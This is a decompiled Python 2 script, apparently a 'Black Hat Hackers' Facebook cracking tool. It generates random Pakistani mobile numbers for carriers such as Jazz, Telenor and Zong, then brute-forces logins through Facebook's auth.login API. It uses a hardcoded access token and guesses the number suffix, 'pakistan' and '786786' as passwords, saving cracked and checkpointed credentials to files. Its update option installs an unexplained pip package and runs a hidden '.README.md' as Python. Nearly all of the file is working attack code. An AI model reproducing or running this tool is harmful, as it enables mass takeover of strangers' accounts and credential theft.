# Decompile by Mr. NIKI:)
# Ablami Korar Sasti
# Time Succes decompile : 2022-01-03 15:41:01.134686
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(50000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nmbr.py')
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def exb():
    print '[!] Exit'
    os.sys.exit()
def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
def t():
    time.sleep(1)
def cb():
    os.system('clear')
logo = '\n\n     \x1b[0;93m   ,----,                                                                 \n    \x1b[0;93m   ,/   .`|                      ,--.                                       \n   \x1b[0;93m  ,`   .\'  : ,---,              ,--.\'|               ,---,,-.----.           \n  \x1b[0;94m ;    ;     /\'  .\' \\         ,--,:  : |       ,---.,`--.\' |\\    /  \\          \n\x1b[0;94m .\'___,/    ,\'/  ;    \'.    ,`--.\'`|  \' :      /__./||   :  :;   :    \\         \n\x1b[0;94m |    :     |:  :       \\   |   :  :  | | ,---.;  ; |:   |  \'|   | .\\ :         \n\x1b[0;92m ;    |.\';  ;:  |   /\\   \\  :   |   \\ | :/___/ \\  | ||   :  |.   : |: |         \n\x1b[0;92m `----\'  |  ||  :  \' ;.   : |   : \'  \'; |\\   ;  \\ \' |\'   \'  ;|   |  \\ :         \n   \x1b[0;92m  \'   :  ;|  |  ;/  \\   \'   \' ;.    ; \\   \\  \\: ||   |  ||   : .  /         \n   \x1b[0;95m  |   |  \'\'  :  | \\  \\ ,\'|   | | \\   |  ;   \\  \' .\'   :  ;;   | |  \\         \n   \x1b[0;95m  \'   :  ||  |  \'  \'--\'  \'   : |  ; .\'   \\   \\   \'|   |  \'|   | ;\\  \\        \n    \x1b[0;95m ;   |.\' |  :  :        |   | \'`--\'      \\   `  ;\'   :  |:   \' | \\.\'        \n   \x1b[0;97m  \'---\'   |  | ,\'        \'   : |           :   \\ |;   |.\' :   : :-\'          \n      \x1b[0;97m       `--\'\'          ;   |.\'            \'---" \'---\'   |   |.\'            \n           \x1b[0;97m                 \'---\'                            `---\'              \n                                                                               \n\n\x1b[1;97m\n\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\n\x1b[1;94m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\n\x1b[1;92m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n\x1b[1;91m\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\x1b[1;92m\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\n\n\x1b[0;95m\xe2\x95\xad\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xae\n\x1b[0;91m\xe2\x95\x91\x1b[0;91mAUTHOR : \x1b[0;96mMd. Tanvir Ahmed                   \x1b[0;91m        \xe2\x95\x91\n\x1b[0;91m\xe2\x95\x91\x1b[0;91mFacebook  :\x1b[0;96m Md. Tanvir Ahmed                         \x1b[0;91m        \xe2\x95\x91\n\x1b[0;91m\xe2\x95\x91\x1b[0;91mFacebook Contact:\x1b[0;96m https://.facebook.com/Shanto.vau404\xe2\x95\x91\n\x1b[0;95m\xe2\x95\xb0\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xaf\n\n'
back = 0
successful = []
cpb = []
oks = []
id = []
def menu():
    os.system('clear')
    print logo
    print '\x1b[1;92m         \xf0\x9f\x94\xa5[ WELCOME TO Black Hat Hackers ]\xf0\x9f\x94\xa5'
    print
    print '\x1b[1;91m          \xe2\x9c\x85SELECT ANY ONE SIM NETWORK\xe2\x9c\x85'
    print '\x1b[1;92m[\xf0\x9f\x92\xab1\xf0\x9f\x92\xab]\x1b[1;97m\xe2\x95\xbc\xe2\x95\xbc\x1b[1;93mMOBILINK     (Press 1)'
    print '\x1b[1;92m[\xf0\x9f\x92\xab2\xf0\x9f\x92\xab]\x1b[1;97m\xe2\x95\xbc\xe2\x95\xbc\x1b[1;92mTELENOR      (Press 2)'
    print '\x1b[1;92m[\xf0\x9f\x92\xab3\xf0\x9f\x92\xab]\x1b[1;97m\xe2\x95\xbc\xe2\x95\xbc\x1b[1;94mWARID        (Press 3)'
    print '\x1b[1;92m[\xf0\x9f\x92\xab4\xf0\x9f\x92\xab]\x1b[1;97m\xe2\x95\xbc\xe2\x95\xbc\x1b[1;95mUFONE        (Press 4)'
    print '\x1b[1;92m[\xf0\x9f\x92\xab5\xf0\x9f\x92\xab]\x1b[1;97m\xe2\x95\xbc\xe2\x95\xbc\x1b[1;96mZONG         (Press 5)'
    print '\x1b[1;92m[\xf0\x9f\x92\xab6\xf0\x9f\x92\xab]\x1b[1;97m\xe2\x95\xbc\xe2\x95\xbc\x1b[1;97mUPDATE SYSTEM'
    print '\x1b[1;92m[\xf0\x9f\x92\xa20\xf0\x9f\x92\xa2]\x1b[1;97m\xe2\x95\xbc\xe2\x95\xbc\x1b[1;91mEXIT   (Back) '
    print 50 * '\x1b[1;90m-'
    action()
def action():
    global cpb
    global oks
    bch = raw_input('\n\x1b[1;92m\xf0\x9f\x9a\x80SELECT ANY ONE NETWORK NUMBER \x1b[1;95m\xe2\x96\xb6\xe2\x96\xb6\xe2\x96\xb6\xe2\x96\xb6\xe2\x96\xb6 \x1b[1;97m ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print '\x1b[1;92m\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\x1b[1;93mMOBILINK/JAZZ CODE HERE\x1b[1;92m\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88'
        print '\x1b[1;91m00, 01, 02, 03, 04,'
        print '\x1b[1;91m05, 06, 07, 08, 09,'
        try:
            c = raw_input(' \x1b[1;91m\xe2\x97\xa2\xe2\x97\x80\x1b[1;92mSELECTED ANYONE CODE\x1b[1;91m\xe2\x96\xb6\xe2\x97\xa3 \x1b[1;97m:\x1b[1;97m ')
            k = '+923'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '2':
        os.system('clear')
        print logo
        print '\x1b[1;92m\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\x1b[1;91mTELENOR CODE HERE\x1b[1;92m\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88'
        print '\x1b[1;93m40, 41, 42, 43, 44,'
        print '\x1b[1;93m45, 64, ??, ??, ??,'
        try:
            c = raw_input(' \x1b[1;91m\xe2\x97\xa2\xe2\x97\x80\x1b[1;92mSELECTED ANYONE CODE\x1b[1;91m\xe2\x96\xb6\xe2\x97\xa3 \x1b[1;97m: \x1b[1;97m')
            k = '+923'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '3':
        os.system('clear')
        print logo
        print '\x1b[1;92m\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\x1b[1;96mWARID CODE HERE\x1b[1;92m\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88'
        print '\x1b[1;95m20, 21, 22, 23,'
        print '\x1b[1;95m24, ??, ??, ??,'
        try:
            c = raw_input(' \x1b[1;91m\xe2\x97\xa2\xe2\x97\x80\x1b[1;92mSELECTED ANYONE CODE\x1b[1;91m\xe2\x96\xb6\xe2\x97\xa3 \x1b[1;97m: \x1b[1;97m')
            k = '+923'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '4':
        os.system('clear')
        print logo
        print '\x1b[1;92m\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\x1b[1;91mUFONE CODE HERE\x1b[1;92m\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88'
        print '\x1b[1;94m31, 32, 33, 34,'
        print '\x1b[1;94m35, 36, 37, ??,'
        try:
            c = raw_input(' \x1b[1;91m\xe2\x97\xa2\xe2\x97\x80\x1b[1;92mSELECTED ANYONE CODE\x1b[1;91m\xe2\x96\xb6\xe2\x97\xa3 \x1b[1;97m: \x1b[1;97m')
            k = '+923'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '5':
        os.system('clear')
        print logo
        print '\x1b[1;92m\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\x1b[1;95mZONG CODE HERE\x1b[1;92m\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88\xe2\x97\x88'
        print '\x1b[1;93m10, 11, 12, 13,'
        print '\x1b[1;93m14, 15, 16, 17,'
        try:
            c = raw_input(' \x1b[1;91m\xe2\x97\xa2\xe2\x97\x80\x1b[1;92mSELECTED ANYONE CODE\x1b[1;91m\xe2\x96\xb6\xe2\x97\xa3 \x1b[1;97m: \x1b[1;97m')
            k = '+923'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '6':
        os.system('clear')
        os.system('pip2 install --upgrade balln')
        os.system('pip2 install --upgrade balln')
        os.system('clear')
        print logo
        print
        psb(' This Tool has been successfully updated\xe2\x9c\x85\xe2\x9c\x85')
        time.sleep(2)
        os.system('python2 .README.md')
    elif bch == '0':
        exb()
    else:
        print '[!] Fill in correctly'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] \x1b[1;93mTotal Numbers: ' + xxx)
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] \x1b[1;96mPlease wait, process is running ...')
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] \x1b[1;92mLast 07 Digit Crack,pakistan,786786 Found ...')
    time.sleep(0.5)
    psb('[!] \x1b[1;91mPress CTRL Then Press Z To Stop This Process')
    time.sleep(0.5)
    print 50 * '\x1b[1;90m-'
    print
    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;91mSHANTO-HACKED\x1b[1;97m-\x1b[1;94m\xe2\x9c\x99\x1b[1;96m-' + k + c + user + '-\x1b[1;93m\xe2\x9c\x99\x1b[1;95m-' + pass1
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91mSHANTO \x1b[1;93m[CP-7DAYS]\x1b[1;95m-\x1b[1;93m\xe2\x97\x80\x1b[1;97m-' + k + c + user + '-\x1b[1;93m\xe2\x96\xb6\x1b[1;92m-' + pass1
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = 'pakistan'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;91mSHANTO-HACKED\xe2\x88\x9a\x1b[1;97m-\x1b[1;94m\xe2\x9c\x99\x1b[1;91m-' + k + c + user + '-\x1b[1;93m\xe2\x9c\x99\x1b[1;91m-' + pass2
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91mSHANTO \x1b[1;93m[CP-7DAYS]\x1b[1;95m-\x1b[1;93m\xe2\x97\x80\x1b[1;97m-' + k + c + user + '-\x1b[1;93m\xe2\x96\xb6\x1b[1;92m-' + pass2
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '786786'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;91mSHANTO-HACKED\xe2\x88\x9a\x1b[1;97m-\x1b[1;94m\xe2\x9c\x99\x1b[1;96m-' + k + c + user + '-\x1b[1;93m\xe2\x9c\x99\x1b[1;95m-' + pass3
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '|' + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91mSHANTO \x1b[1;93m[CP-7DAYS)\x1b[1;95m-\x1b[1;93m\xe2\x97\x80\x1b[1;97m-' + k + c + user + '-\x1b[1;93m\xe2\x96\xb6\x1b[1;92m-' + pass3
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '-'
    print '[\xe2\x9c\x93] Process Has Been Completed ....'
    print '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 .README.md')
if __name__ == '__main__':
    menu()
# Mau Ngapain Cuk?
